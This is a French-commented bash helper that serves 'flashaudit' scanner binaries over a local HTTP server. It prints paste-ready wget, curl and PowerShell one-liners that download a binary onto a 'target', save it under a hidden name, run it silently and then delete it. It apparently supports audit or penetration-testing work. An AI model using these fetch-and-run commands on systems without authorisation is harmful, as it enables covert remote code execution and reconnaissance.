#!/usr/bin/env bash
# serve.sh — lance un serveur HTTP local et affiche la commande à coller sur la cible.
# Usage: ./serve.sh [PORT]

set -euo pipefail
PORT="${1:-8888}"

# Trouver les binaires disponibles
find_bins() {
  for f in flashaudit-linux-amd64 flashaudit-linux-arm64 \
            flashaudit-windows-amd64.exe flashaudit-windows-386.exe; do
    [[ -f "$f" ]] && echo "  $f  ($(du -sh "$f" | cut -f1)o)"
  done
}

# Trouver l'IP locale (première interface non-loopback)
local_ip() {
  ip route get 1.1.1.1 2>/dev/null | awk '/src/{print $7; exit}' \
  || hostname -I 2>/dev/null | awk '{print $1}' \
  || echo "TON_IP"
}

IP=$(local_ip)

echo ""
echo "  Binaires disponibles :"
find_bins
echo ""
echo "  Serveur HTTP : http://${IP}:${PORT}/"
echo ""
echo "  ── Commandes à coller sur la cible ──────────────────────────────────"
echo ""
echo "  Linux (wget) :"
echo "    wget -qO /tmp/.fa http://${IP}:${PORT}/flashaudit-linux-amd64 && chmod +x /tmp/.fa && /tmp/.fa --scan --stdout --format=md 2>/dev/null; rm -f /tmp/.fa"
echo ""
echo "  Linux (curl) :"
echo "    curl -so /tmp/.fa http://${IP}:${PORT}/flashaudit-linux-amd64 && chmod +x /tmp/.fa && /tmp/.fa --scan --stdout --format=md 2>/dev/null; rm -f /tmp/.fa"
echo ""
echo "  Windows (PowerShell) :"
echo '    (New-Object Net.WebClient).DownloadFile("http://'"${IP}:${PORT}"'/flashaudit-windows-amd64.exe","$env:TEMP\fa.exe"); & "$env:TEMP\fa.exe" --scan --stdout --format=md'
echo ""
echo "  ─────────────────────────────────────────────────────────────────────"
echo "  Ctrl+C pour arrêter."
echo ""

# Démarrer le serveur (Python 3 ou Python 2)
if command -v python3 &>/dev/null; then
  python3 -m http.server "$PORT"
elif command -v python &>/dev/null; then
  python -m SimpleHTTPServer "$PORT"
else
  echo "  Python non trouvé — lancer manuellement : python3 -m http.server ${PORT}"
fi
